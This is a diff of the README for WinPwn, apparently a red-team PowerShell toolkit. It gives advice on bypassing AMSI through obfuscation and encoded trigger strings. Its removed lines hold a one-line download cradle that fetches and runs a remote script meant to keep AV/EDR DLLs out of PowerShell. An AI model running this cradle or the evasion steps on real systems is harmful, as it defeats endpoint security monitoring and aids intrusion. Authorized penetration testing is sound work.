@@ -18,12 +18,6 @@ Just Import the Modules with:
 
 To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 
 
-To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:
-
-`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`
-
-This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.
-
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use `Offline_Winpwn.ps1`, the most important scripts and executables are included.
 
 Functions available after Import:
